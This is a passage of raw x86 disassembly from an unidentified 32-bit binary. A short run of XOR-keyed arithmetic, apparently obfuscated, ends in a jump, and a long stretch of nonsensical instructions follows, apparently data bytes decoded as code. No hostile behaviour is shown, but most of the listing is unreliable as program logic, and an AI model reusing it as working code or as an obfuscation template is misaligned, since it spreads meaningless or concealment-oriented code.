  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	call   0x7da1d568
  414251:	inc    esi
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	push   ss
  414259:	push   cs
  41425a:	pop    ebp
  41425b:	int    0x40
  41425d:	in     eax,dx
  41425e:	jmp    0xef0e0ea6
  414263:	mov    eax,ds:0x4797a008
  414268:	enter  0xff6d,0x3e
  41426c:	popf   
  41426d:	inc    esp
  41426e:	aas    
  41426f:	inc    ecx
  414270:	xor    BYTE PTR [eax-0xd],al
  414273:	and    esp,DWORD PTR [esi+0x2f6e7d10]
  414279:	nop
  41427a:	pop    ecx
  41427b:	arpl   WORD PTR [edi+0x6c],sp
  41427e:	dec    edx
  41427f:	es jg  0x41420b
  414282:	mov    ch,0x83
  414284:	jb     0x414216
  414286:	arpl   WORD PTR [eax-0x6ccc8c1d],si
  41428c:	repnz mov edi,0xc068e05b
  414292:	pop    ds
  414293:	in     eax,0x85
  414295:	add    DWORD PTR [eax+0x14],edx
  414298:	popf   
  414299:	mul    BYTE PTR [esi+0x39]
  41429c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41429d:	inc    edi
  41429e:	lahf   
  41429f:	fnsave [ecx]
  4142a1:	leave  
  4142a2:	sti    
  4142a3:	jne    0x4142a5
  4142a5:	or     DWORD PTR [esp+edi*1],esi
  4142a8:	jo     0x4142a2
  4142aa:	push   es
  4142ab:	mov    esi,0x894c8c7b
  4142b0:	sbb    al,dl
  4142b2:	out    0x0,al
  4142b4:	cmp    eax,0x59afc4d5
  4142b9:	dec    ebp
  4142ba:	push   edi
  4142bb:	pop    ds
  4142bc:	mov    al,0x7b
  4142be:	repz pushf 
  4142c0:	pusha  
  4142c1:	cmc    
  4142c2:	lea    eax,[ebx-0x5e]
  4142c5:	(bad)  
  4142c6:	ins    DWORD PTR es:[edi],dx
  4142c7:	repz adc eax,0xa0b5a8fe
  4142cd:	mov    ah,0x76
  4142cf:	add    edi,ebp
  4142d1:	jl     0x414306
  4142d3:	cmp    eax,0xf1f6e872
  4142d8:	cmp    edi,DWORD PTR ds:0xb86863ee
  4142de:	push   0x6c69a03d
  4142e3:	push   ebp
  4142e4:	ins    BYTE PTR es:[edi],dx
  4142e5:	push   es
  4142e6:	cmp    BYTE PTR [ebp-0x6f],dl
  4142e9:	cmc    
  4142ea:	jb     0x4142a4
  4142ec:	add    DWORD PTR [ebx-0x9f006f5],0x266fa269
  4142f6:	fisttp DWORD PTR [ebp+edi*8-0x4d524479]
  4142fd:	xchg   edx,edx
  4142ff:	add    edi,edx
  414301:	dec    ebx
  414302:	mov    ebp,0xde64f833
  414307:	sbb    al,0xc5
  414309:	test   DWORD PTR [esi],edi
  41430b:	sahf   
  41430c:	into   
  41430d:	call   0xeadadc60
  414312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414313:	mov    al,BYTE PTR [ecx]
  414315:	jmp    0x90ea9d73
  41431a:	mov    ecx,0x5c058b1b
  41431f:	pop    esp
  414320:	daa    
  414321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414322:	or     esi,DWORD PTR [esi]
  414324:	fidiv  WORD PTR [ebx+0x634984c7]
  41432a:	dec    ebx
  41432b:	push   ss
  41432c:	jb     0x4142c3
  41432e:	sar    BYTE PTR [eax+edi*4-0x1b16fe61],1
  414335:	jno    0x4142d5
  414337:	xor    BYTE PTR [ecx],cl
  414339:	cmp    BYTE PTR [eax-0x37],cl
  41433c:	(bad)  
  41433d:	or     al,0xca
  41433f:	xor    al,0x9e
  414341:	popf   
  414342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414343:	mov    ebx,0x4709e230
  414348:	adc    esi,DWORD PTR [edx]
  41434a:	push   edi
  41434b:	cmovno esp,ecx
  41434e:	mov    dl,0x82
  414350:	inc    esp
  414351:	jmp    0xe72840e
  414356:	dec    edx
  414357:	push   edx
  414358:	jb     0x414306
  41435a:	retf   
  41435b:	mov    bl,bl
  41435d:	cwde   
  41435e:	popf   
  41435f:	dec    esi
  414360:	(bad)  
  414361:	ss jne 0x4143a3
  414364:	and    eax,0x967bb5c8
  41436a:	lahf   
  41436b:	and    eax,DWORD PTR [eax+ebx*1]
  41436e:	lock scas eax,DWORD PTR es:[edi]
  414370:	outs   dx,DWORD PTR ds:[esi]
  414371:	not    DWORD PTR [eax+0x3705ff7f]
  414377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414378:	sahf   
  414379:	push   ebp
  41437a:	jp     0x414321
  41437c:	mov    dl,0xd5
  41437e:	outs   dx,DWORD PTR ds:[esi]
  41437f:	fwait
  414380:	pop    ebx
  414381:	pop    ebp
  414382:	add    edx,eax
  414384:	mov    WORD PTR [esi],?
  414386:	jbe    0x41437a
  414388:	dec    eax
  414389:	push   esi
  41438a:	dec    edx
  41438b:	inc    edi
  41438c:	xor    dh,BYTE PTR [eax+0x650790c3]
  414392:	arpl   WORD PTR [esi-0x1e660ce2],bx
  414398:	or     eax,0xd813bf78
  41439d:	jg     0x4143f3
  41439f:	call   0x67:0xe670cc7c
  4143a6:	adc    al,0x32
  4143a8:	adc    al,0xc9
  4143aa:	jb     0x4143c1
  4143ac:	cld    
  4143ad:	xor    ecx,DWORD PTR [ebx+0xa58d85]
  4143b3:	xor    al,0x60
  4143b5:	lock push es
  4143b7:	add    al,0xb9
  4143b9:	jnp    0x41436a
  4143bb:	or     edx,edi
  4143bd:	fdiv   QWORD PTR ds:0xd91245f9
  4143c3:	js     0x414437
  4143c5:	sbb    edi,DWORD PTR [eax]
  4143c7:	pop    ebp
  4143c8:	(bad)  
  4143c9:	mov    eax,0xf6c09584
  4143ce:	das    
  4143cf:	cmp    BYTE PTR [ecx+0x6883b4ab],ch
  4143d5:	adc    DWORD PTR [ebx],0xd66c2e6c
  4143db:	mov    al,ds:0x660d2add
  4143e0:	and    DWORD PTR gs:[esi+0x75],esi
  4143e4:	imul   ecx,DWORD PTR [edx+0xe],0xffffffe2
  4143e8:	jno    0x414461
  4143ea:	jbe    0x414373
  4143ec:	retf   0x95b7
  4143ef:	pop    eax
  4143f1:	mov    BYTE PTR [ebp+0x32],ch
  4143f4:	imul   edi,edi,0xc6beefa3
  4143fa:	repz cwde 
  4143fc:	daa    
  4143fd:	and    DWORD PTR [esi+0x5b55b5f7],ebx
  414403:	lock dec edi
  414405:	or     DWORD PTR ds:0xc2d816ea,edi
  41440b:	mov    fs,WORD PTR [ecx]
  41440d:	retf   0x6ff6
  414410:	stc    
  414411:	push   esp
  414412:	jae    0x414469
  414414:	adc    DWORD PTR [edx+0x2f3f8404],ebx
  41441a:	mov    eax,0x4d151185
  41441f:	xchg   ecx,eax
  414420:	je     0x4143f4
  414422:	jle    0x4143f4
  414424:	or     eax,0xeb792755
  414429:	mov    ebx,DWORD PTR [ecx]
  41442b:	sbb    BYTE PTR [eax+0x10],0xfd
  41442f:	inc    edi
  414430:	cld    
  414431:	inc    edx
  414432:	xor    ah,BYTE PTR ds:0x8d5d0849
  414438:	stos   BYTE PTR es:[edi],al
  414439:	pop    es
  41443a:	push   eax
  41443b:	(bad)  
  41443c:	je     0x414428
  41443e:	sahf   
  41443f:	into   
  414440:	xor    al,0x76
  414442:	aas    
  414443:	jle    0x4143c9
  414445:	call   FWORD PTR [ecx-0x11]
  414448:	mov    ebp,0x7516ae85
  41444d:	xchg   edi,eax
  41444e:	gs ds dec ecx
  414451:	mov    dl,0xad
  414453:	sub    BYTE PTR [esi+0x77aafa26],dl
  414459:	dec    eax
  41445a:	push   0x6ef351a
  41445f:	mov    ecx,0xa99deb78
  414464:	mov    edx,0x8246e3c3
  414469:	cmp    DWORD PTR [ecx+0x33],0x2e8e911e
  414470:	mov    ds:0x2f0161fc,al
  414475:	mov    dh,0x7c
  414477:	push   esp
  414478:	mov    BYTE PTR [esi-0x2b],cl
  41447b:	retf   
  41447c:	xlat   BYTE PTR ds:[ebx]
  41447d:	sti    
  41447e:	sbb    ebx,ecx
  414480:	and    dh,BYTE PTR [ecx-0x2905640d]
  414486:	loope  0x4144c1
  414488:	mov    ds:0x51388612,al
  41448d:	shl    DWORD PTR [edi-0x70],1
  414490:	jne    0x414494
  414492:	push   esi
  414493:	shl    BYTE PTR [ebx],cl
  414495:	jg     0x414429
  414497:	xor    al,0x8c
  414499:	or     cl,ah
  41449b:	imul   ecx,DWORD PTR [esp],0x78bf03ec
  4144a2:	mov    bh,0x26
  4144a4:	(bad)
  4144a8:	nop
  4144a9:	(bad)  
  4144aa:	xor    BYTE PTR ds:[ecx],bl
  4144ad:	dec    ebp
  4144ae:	pop    eax
  4144af:	cs add al,0xec
  4144b2:	pop    ss
  4144b3:	dec    eax
  4144b4:	and    al,BYTE PTR [ebx*4+0xb883102]
  4144bb:	inc    ebp
  4144bc:	jmp    0x41452a
  4144be:	out    dx,al
  4144bf:	and    BYTE PTR [ecx],dh
  4144c1:	in     eax,dx
  4144c2:	jbe    0x41445b
  4144c4:	jne    0x4144d2
  4144c6:	cmp    al,0x3f
  4144c8:	addr16 loope 0x414509
  4144cb:	lods   eax,DWORD PTR ds:[esi]
  4144cc:	push   ds
  4144cd:	pop    ebx
  4144ce:	call   0x71ac:0x5477e45c
  4144d5:	dec    esi
  4144d6:	or     ebx,DWORD PTR [ebx]
  4144d8:	adc    BYTE PTR [edi-0x1349da2],0x9
  4144df:	xchg   BYTE PTR ds:[esi],ah
  4144e2:	cmp    eax,0xed6b72db
  4144e7:	mov    ds:0x176f4a7c,al
  4144ec:	enter  0x65fc,0xc7
  4144f0:	mov    ch,0x1c
  4144f2:	cld    
  4144f3:	mov    edi,0xfa3d36e7
  4144f8:	cs je  0x41451e
  4144fb:	outs   dx,BYTE PTR ds:[esi]
  4144fc:	ret    0xb291
  4144ff:	in     eax,dx
  414500:	mov    al,ds:0x210a29e8
  414505:	rcr    bh,cl
  414507:	ret    
  414508:	mov    edx,0xd16ac20e
  41450d:	daa    
  41450e:	rol    DWORD PTR fs:[ebp+0x20f6f935],cl
  414515:	xchg   ecx,eax
  414516:	dec    esi
  414517:	call   0x5260:0x1155b631
  41451e:	bound  edx,QWORD PTR [edx-0x1fc8648f]
  414524:	clc    
  414525:	xor    cl,BYTE PTR [eax+0x584632dd]
  41452b:	cmp    eax,0x641c329c
  414530:	push   ebp
  414531:	cvtps2pi mm5,QWORD PTR [edx+esi*4-0x20ce3129]
  414539:	stos   BYTE PTR es:[edi],al
  41453a:	dec    ebx
  41453b:	mov    bh,0xfa
  41453d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41453e:	cli    
  41453f:	dec    esp
  414540:	shl    BYTE PTR [eax],cl
  414542:	div    BYTE PTR [ebx+eax*8]
  414545:	xchg   DWORD PTR [edi-0x1a97b35e],esi
  41454b:	test   DWORD PTR [ecx],ecx
  41454d:	sti    
  41454e:	fwait
  41454f:	dec    edx
  414550:	mov    gs,edi
  414552:	in     al,dx
  414553:	int    0x34
  414555:	idiv   BYTE PTR [ebp-0x5e]
  414558:	out    dx,eax
  414559:	jo     0x4145da
  41455b:	push   cs
  41455c:	pop    edi
  41455d:	mov    al,0xd4
  41455f:	pop    ds
  414560:	aad    0x19
  414562:	jmp    0x92b6:0xf5ff3e9
  414569:	(bad)  
  41456a:	stc    
  41456b:	gs adc al,0x32
  41456e:	mov    BYTE PTR [esi-0x1d26be5e],dh
  414574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414575:	mov    esi,0xda05718c
  41457a:	scas   eax,DWORD PTR es:[edi]
  41457b:	cmp    bl,bh
  41457d:	test   al,0xcc
  41457f:	fadd   st,st(0)
  414581:	jmp    0x414507
  414583:	push   0xed7940bd
  414588:	pop    eax
  414589:	(bad)  
  41458b:	adc    cl,BYTE PTR [ebx+esi*4]
  41458e:	inc    esi
  41458f:	ins    DWORD PTR es:[edi],dx
  414590:	cld    
  414591:	(bad)  
  414592:	push   0x57
  414594:	mov    WORD PTR [esi-0x62],gs
  414597:	inc    edi
  414598:	sbb    ah,BYTE PTR [edi+ebp*1]
  41459b:	xor    DWORD PTR [edx+0x4b],edx
  41459e:	pop    es
  41459f:	mov    ebp,0xc7568dc8
  4145a4:	jbe    0x414597
  4145a6:	adc    esi,ebp
  4145a8:	push   eax
  4145a9:	cwde   
  4145aa:	sbb    DWORD PTR [ecx+0x2db23240],edi
  4145b0:	add    cl,ah
  4145b2:	xor    al,0x64
  4145b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145b5:	(bad)  
  4145b6:	mov    ebx,0xe8c0832e
  4145bb:	hlt    
  4145bc:	aad    0xf5
  4145be:	adc    DWORD PTR [edi],eax
  4145c0:	sbb    edx,edi
  4145c2:	add    al,0x71
  4145c4:	(bad)  
  4145c5:	gs dec ebp
  4145c7:	sbb    ebx,DWORD PTR [edi]
  4145c9:	cmp    DWORD PTR [eax],esp
  4145cb:	xchg   DWORD PTR [eax+0x60450cef],ebp
  4145d1:	jle    0x414579
  4145d3:	jmp    0x571e:0xe0541c38
  4145da:	xlat   BYTE PTR ds:[ebx]
  4145db:	add    cl,cl
  4145dd:	outs   dx,BYTE PTR ds:[esi]
  4145de:	pop    ds
  4145df:	ss nop
  4145e1:	mov    al,ds:0x8642cfcb
  4145e6:	enter  0x8295,0xbb
  4145ea:	and    eax,0xb8ad7123
  4145ef:	shl    BYTE PTR [edx+0x457a5bb8],1
  4145f5:	loopne 0x41457c
  4145f7:	push   eax
  4145f8:	cli    
  4145f9:	out    0x67,eax
  4145fb:	clc    
  4145fc:	dec    ebp
  4145fd:	fs xchg ecx,eax
  4145ff:	xchg   edx,eax
  414600:	jnp    0x41460d
  414602:	and    ah,al
  414604:	sub    dl,al
  414606:	test   al,0xde
  414608:	mov    bh,0xcd
  41460a:	push   ss
  41460b:	test   al,0x1d
  41460d:	test   cl,bh
  41460f:	aad    0xc
  414611:	es and cl,bl
  414614:	fs mov esp,0x1f0da71a
  41461a:	push   esi
  41461b:	inc    esp
  41461c:	leave  
  41461d:	xchg   DWORD PTR [edi+0x13f58691],edi
  414623:	stos   BYTE PTR es:[edi],al
  414624:	bound  edx,QWORD PTR [edx-0x27]
  414627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414628:	neg    DWORD PTR [ebx+0xf]
  41462b:	jbe    0x41467c
  41462d:	or     BYTE PTR [edi-0x759fa3f3],bh
  414633:	popa   
  414634:	and    eax,0xa253a47b
  414639:	ins    DWORD PTR es:[edi],dx
  41463a:	or     BYTE PTR [esi-0x49e6c41e],dh
  414640:	js     0x414622
  414642:	mov    eax,ds:0x74c6bd6e
  414647:	sar    bl,1
  414649:	xlat   BYTE PTR ds:[ebx]
  41464a:	and    al,0xe8
  41464c:	cli    
  41464d:	xchg   esi,edi
  41464f:	pushf  
  414650:	xor    al,0x32
  414652:	pop    ss
  414653:	pusha  
  414654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414655:	sub    eax,0xa3a2a21a
  41465a:	mov    cl,0xf4
  41465c:	adc    DWORD PTR ds:0x40823244,0x26a41a2a
  414666:	add    ecx,edi
  414668:	out    dx,eax
  414669:	test   BYTE PTR [edi],dh
  41466b:	fstp   st(1)
  41466d:	jg     0x4145f1
  41466f:	jb     0x414661
  414671:	lods   al,BYTE PTR es:[esi]
  414673:	in     al,dx
  414674:	icebp  
  414675:	scas   eax,DWORD PTR es:[edi]
  414676:	sbb    eax,edx
  414678:	mov    esp,0xeac4fc03
  41467d:	lea    esi,[eax-0xc]
  414680:	les    ebp,FWORD PTR [edx+0x1163a85f]
  414686:	popf   
  414687:	scas   eax,DWORD PTR es:[edi]
  414688:	mov    dl,0xa1
  41468a:	sub    esi,edi
  41468c:	cmp    DWORD PTR [ebx],esi
  41468e:	xchg   BYTE PTR [eax-0x68cc8c35],cl
  414694:	scas   al,BYTE PTR es:[edi]
  414695:	adc    BYTE PTR [eax-0x4fa0c2d4],0x4e
  41469c:	mov    esi,0x57a22074
  4146a1:	jecxz  0x414699
  4146a3:	dec    eax
  4146a4:	mov    bh,0x58
  4146a6:	and    edx,DWORD PTR [esi]
  4146a8:	imul   esp,DWORD PTR [ebp+0x13dd6ea],0xffffffe8
  4146af:	(bad)  
  4146b0:	aas    
  4146b1:	jge    0x41472c
  4146b3:	(bad)  
  4146b4:	fs aas 
  4146b6:	pmaddwd mm2,QWORD PTR [edx-0x7a]
  4146ba:	mov    ebp,0x2d7d5947
  4146bf:	xchg   ecx,eax
  4146c0:	and    al,0x3b
  4146c2:	adc    eax,0x667363a9
  4146c7:	mov    ebp,DWORD PTR [eax+0x32abd96d]
  4146cd:	push   ebx
  4146ce:	cmc    
  4146cf:	(bad)  
  4146d0:	mov    BYTE PTR [edx+0x77a8272f],al
  4146d6:	push   0x53ac3c6f
  4146db:	clc    
  4146dc:	aad    0x51
  4146de:	test   DWORD PTR [edi-0x64b3a6c9],0x31934b9
  4146e8:	std    
  4146e9:	cdq    
  4146ea:	outs   dx,BYTE PTR ds:[esi]
  4146eb:	fistp  QWORD PTR [ebp-0xd8c864a]
  4146f1:	push   esi
  4146f2:	mov    ah,0xb3
  4146f4:	jp     0x414772
  4146f6:	and    bh,BYTE PTR [esp+ebx*8+0xf]
  4146fa:	scas   al,BYTE PTR es:[edi]
  4146fb:	or     dl,BYTE PTR [esi*8-0x5d12c2ff]
  414702:	or     al,0xfa
  414704:	push   ss
  414705:	inc    edi
  414706:	ficomp WORD PTR [esi+eax*4]
  414709:	leave  
  41470a:	push   eax
  41470b:	test   BYTE PTR [eax-0x707fd565],0x17
  414712:	jmp    0x1002:0xa8bcccab
  414719:	fsubr  QWORD PTR [ebx+0x1c75a213]
  41471f:	add    edi,DWORD PTR [ebx+0x74]
  414722:	xor    DWORD PTR [eax-0x38],0x24
  414726:	or     dl,BYTE PTR [edx-0x4f]
  414729:	inc    ebx
  41472a:	mov    ?,esi
  41472c:	cdq    
  41472d:	inc    edi
  41472e:	pop    ss
  41472f:	fbstp  TBYTE PTR [edi+eax*2+0x47]
  414733:	xor    ch,dh
  414735:	sub    ecx,edi
  414737:	stc    
  414738:	push   es
  414739:	imul   esp,DWORD PTR [edi+ebx*8],0xd32a0426
  414740:	xchg   esi,eax
  414741:	add    dh,BYTE PTR [ebp+0x1c]
  414744:	mov    ds:0x5754406e,eax
  414749:	sub    BYTE PTR [eax+ebx*4-0x18],0xc0
  41474e:	sub    bh,BYTE PTR ds:0x1f137a28
  414754:	outs   dx,DWORD PTR ds:[esi]
  414755:	popf   
  414756:	lds    esp,FWORD PTR [ebx]
  414758:	push   esp
  414759:	cmp    esi,DWORD PTR [esi+edi*2]
  41475c:	jp     0x4147c9
  41475e:	dec    edi
  41475f:	rol    dh,1
  414761:	inc    DWORD PTR [edx]
  414763:	in     al,0x4c
  414765:	neg    BYTE PTR [edi]
  414767:	(bad)  
  414768:	out    0x17,al
  41476a:	mov    fs,WORD PTR [ecx]
  41476c:	push   esi
  41476d:	pop    ss
  41476e:	and    al,0x38
  414770:	jne    0x4147df
  414772:	(bad)  
  414773:	lahf   
  414774:	mov    edx,0x1159d2b3
  414779:	dec    ebp
  41477a:	enter  0xc4e7,0x3f
  41477e:	xor    esp,edi
  414780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414781:	and    ebp,esp
  414783:	rcr    DWORD PTR [ecx+0x2efd206a],0x43
  41478a:	inc    esi
  41478b:	add    DWORD PTR [edi-0x71],ebx
  41478e:	aas    
  41478f:	fs jbe 0x414805
  414792:	sbb    DWORD PTR [ebx+0x58],0x8e925237
  414799:	jns    0x4147fa
  41479b:	fsubr  QWORD PTR [edx+0x34a830b0]
  4147a1:	test   al,0x1
  4147a3:	and    ebp,DWORD PTR [esi+ebp*2]
  4147a6:	adc    BYTE PTR [edx-0x2a],0xc1
  4147aa:	dec    ecx
  4147ab:	xchg   BYTE PTR [ecx-0x1d],bl
  4147ae:	jle    0x41478f
  4147b0:	adc    DWORD PTR [esi+0x5ac4bba6],edi
  4147b6:	in     al,0xa8
  4147b8:	add    edi,DWORD PTR ds:0x62743590
  4147be:	ja     0x414767
  4147c0:	sub    DWORD PTR [ebp+0xe],edi
  4147c3:	pop    edi
  4147c4:	mov    eax,ds:0x66231609
  4147c9:	test   al,0x6e
  4147cb:	jge    0x414778
  4147cd:	aaa    
  4147ce:	daa    
  4147cf:	mov    es:0x27c3fe26,al
  4147d5:	xor    dh,BYTE PTR [ebp+eiz*4+0x7f5f5b10]
  4147dc:	test   BYTE PTR [edi+0x7588ec0c],bl
  4147e2:	mov    edi,0xfcacb6e6
  4147e7:	inc    edx
  4147e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147e9:	out    dx,eax
  4147ea:	jo     0x4147b5
  4147ec:	shl    esp,0x2
  4147ef:	or     cl,cl
  4147f1:	dec    edx
  4147f2:	std    
  4147f3:	ret    
  4147f4:	ror    DWORD PTR [edi+0x21],1
  4147f7:	sub    esi,DWORD PTR [ecx]
  4147f9:	retf   0x10e3
  4147fc:	fisub  DWORD PTR [esi-0x39]
  4147ff:	inc    ebx
  414801:	mov    bl,0x8
  414803:	sub    ebx,DWORD PTR ds:0x212dc1a8
  414809:	out    dx,al
  41480a:	mov    ch,0xf7
  41480c:	ss inc eax
  41480e:	mov    esp,0xa5fee617
  414813:	lods   al,BYTE PTR ds:[esi]
  414814:	sub    BYTE PTR [eax+0x71],dh
  414817:	popa   
  414818:	popa   
  414819:	call   DWORD PTR [esi]
  41481b:	mov    ebx,0x66ead3b6
  414820:	mov    dh,0x4b
  414822:	or     DWORD PTR [ebx],ecx
  414824:	shl    ecx,cl
  414826:	repnz dec ecx
  414828:	adc    BYTE PTR ss:[ebp-0x23],ch
  41482c:	shl    BYTE PTR [esi-0x6232fedc],0xf2
  414833:	clc    
  414834:	js     0x414863
  414836:	or     al,0xc7
  414838:	dec    ebp
  414839:	inc    ebx
  41483a:	rol    DWORD PTR [ebx],0xc6
  41483d:	inc    ebp
  41483e:	push   edi
  41483f:	out    dx,al
  414840:	mov    edx,0xdc504ad1
  414845:	mov    WORD PTR [esp+eax*1+0xfa7dc80],?
  41484c:	ins    DWORD PTR es:[edi],dx
  41484d:	adc    BYTE PTR [edx-0x349f462e],0x6b
  414854:	sbb    al,0x9c
  414856:	mov    ds:0xd5f0e6e8,al
  41485b:	push   ebp
  41485c:	jbe    0x41487a
  41485e:	pop    es
  41485f:	in     al,dx
  414860:	(bad)  
  414861:	fisttp WORD PTR [edx+0x5e419ec8]
  414867:	(bad)  
  414868:	push   edx
  414869:	mov    ebp,0xc88bf000
  41486e:	push   0xffffffe1
  414870:	adc    al,0x12
  414872:	(bad)  
  414873:	sar    esp,1
  414875:	push   ebx
  414876:	mov    cl,0xeb
  414878:	push   esp
  414879:	fisubr DWORD PTR [eax+0x1cd01bfe]
  41487f:	test   al,0x6c
  414882:	loopne 0x414815
  414884:	mov    ebp,0xab5d12d8
  414889:	popa   
  41488a:	mov    al,ds:0x104cb8ed
  41488f:	xor    DWORD PTR [esi],ebx
  414891:	das    
  414892:	mov    ecx,0x8877737
  414897:	mov    BYTE PTR [esi+0x21],al
  41489a:	and    eax,0x10995a31
  41489f:	(bad)  
  4148a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148a1:	xchg   ebp,eax
  4148a2:	ror    DWORD PTR [edx+0x5821ea95],0x21
  4148a9:	xor    bh,al
  4148ab:	and    bl,ch
  4148ad:	stos   DWORD PTR es:[edi],eax
  4148ae:	repnz aaa 
  4148b0:	xchg   ecx,ecx
  4148b2:	fcomp  DWORD PTR [eax]
  4148b4:	test   DWORD PTR [edi-0x18],edx
  4148b7:	sbb    esi,ebx
  4148b9:	pop    ebx
  4148ba:	jns    0x41483d
  4148bc:	inc    esi
  4148bd:	and    edi,ebp
  4148bf:	cli    
  4148c0:	push   cs
  4148c1:	and    edi,ebp
  4148c3:	ret    0xbe47
  4148c6:	std    
  4148c7:	imul   esp,DWORD PTR [ecx+0x64bbb9f1],0xfffffff9
  4148ce:	xor    BYTE PTR [ebx+0x59],ch
  4148d1:	loop   0x4148f0
  4148d3:	dec    edx
  4148d4:	(bad)  
  4148d5:	cmc    
  4148d6:	sahf   
  4148d7:	adc    esp,edx
  4148d9:	bound  esp,QWORD PTR [ecx-0x3ad451af]
  4148df:	test   ah,bl
  4148e1:	pop    ss
  4148e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148e3:	cmp    DWORD PTR [edi-0x48],0x9da50cae
  4148ea:	push   esp
  4148eb:	push   edx
  4148ec:	std    
  4148ed:	jle    0x414884
  4148ef:	mov    eax,ds:0xd8146a46
  4148f4:	jnp    0x41490a
  4148f6:	mov    DWORD PTR [eax+ecx*4-0x29],eax
  4148fa:	gs jmp 0xeb81:0x6acb3392
  414902:	lock mov ss,WORD PTR [esi]
  414905:	mov    ebx,0x23703fae
  41490a:	or     eax,0xb8e50f48
  41490f:	or     BYTE PTR [ecx+0x5],0xbe
  414913:	xchg   esi,eax
  414914:	ror    BYTE PTR [ebx+0x13cc2dd4],0xad
  41491b:	mov    eax,ds:0xfbde929f
  414920:	jg     0x414988
  414922:	jl     0x4148d6
  414924:	push   ds
  414925:	and    DWORD PTR [edx],eax
  414927:	retf   
  414928:	mov    cl,0x89
  41492a:	cmp    eax,0x76dc5c97
  41492f:	mov    ch,0x3c
  414931:	(bad)  [eax-0x5f]
  414934:	loope  0x4148db
  414936:	push   0x4b
  414938:	mov    DWORD PTR [ebp+0x2a],esi
  41493b:	test   eax,0x7d728cdc
  414940:	push   esp
  414941:	push   ds
  414942:	sahf   
  414943:	xchg   DWORD PTR [ecx+0x2],ebx
  414946:	sub    eax,0xac2ddac8
  41494b:	out    0x2c,al
  41494d:	push   ds
  41494e:	xor    DWORD PTR [edi],edx
  414950:	and    eax,0x78863b7f
  414955:	mov    bh,0x7c
  414957:	adc    BYTE PTR [edi+0x36],ah
  41495a:	pop    ds
  41495b:	(bad)  
  41495c:	jmp    0xcba9:0x8ac0d639
  414963:	lods   al,BYTE PTR ds:[esi]
  414964:	pop    esp
  414965:	stos   DWORD PTR es:[edi],eax
  414966:	add    ah,BYTE PTR [ecx-0x1e]
  414969:	jno    0x414951
  41496b:	rcr    BYTE PTR [ebx-0x57],0xe3
  41496f:	fcmovne st,st(4)
  414971:	mov    ch,0x95
  414973:	clc    
  414974:	lods   al,BYTE PTR ds:[esi]
  414975:	gs call 0xe47ddda1
  41497b:	xchg   edi,eax
  41497c:	add    cl,BYTE PTR [esi+0x29540593]
  414982:	scas   eax,DWORD PTR es:[edi]
  414983:	out    dx,al
  414984:	mov    dl,cl
  414986:	xor    BYTE PTR ds:[edi+0x77c69614],ch
  41498d:	and    BYTE PTR [eax+0x69c2d526],bh
  414993:	cmp    eax,0x68964116
  414998:	xchg   edi,eax
  414999:	mov    dl,al
  41499b:	retf   0x91e4
  41499e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41499f:	and    al,0x52
  4149a2:	scas   al,BYTE PTR es:[edi]
  4149a3:	push   esp
  4149a4:	push   ss
  4149a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149a6:	push   0x99818ed4
  4149ab:	pop    eax
  4149ac:	push   0x1b943
  4149b1:	ss ins BYTE PTR es:[edi],dx
  4149b3:	sbb    al,0xa0
  4149b5:	inc    ebx
  4149b6:	mov    al,ds:0xfeade36d
  4149bb:	cmp    BYTE PTR [eax],ah
  4149bd:	and    eax,0xf7a63cfc
  4149c2:	pop    ax
  4149c4:	or     ebx,DWORD PTR [ecx]
  4149c6:	xchg   ecx,eax
  4149c7:	pop    ss
  4149c8:	adc    eax,0xe3569a2e
  4149cd:	repnz aad 0x4e
  4149d0:	imul   ebx,esi,0xfc618be8
